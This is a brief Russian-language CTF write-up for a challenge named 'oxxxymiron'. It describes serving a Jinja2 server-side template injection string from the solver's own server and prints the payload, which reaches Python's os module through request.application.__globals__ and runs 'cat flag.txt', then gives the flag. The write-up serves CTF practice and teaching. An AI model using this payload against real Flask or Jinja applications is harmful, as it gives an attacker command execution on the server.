# oxxxymiron writeup

Поднимем свой сервер, который будет возвращать SSTI строку.

```python
def index():
    return '{{request.application.__globals__.__builtins__.__import__("os").popen("cat\\x20flag.txt").read()}}'
```

Прочитаем флаг. Пример сервера в [solve.py](solve.py)

Флаг: `li2CTF{I_r3Pe4t_My5elF_wH3n_4nDEr_Stre$$}`
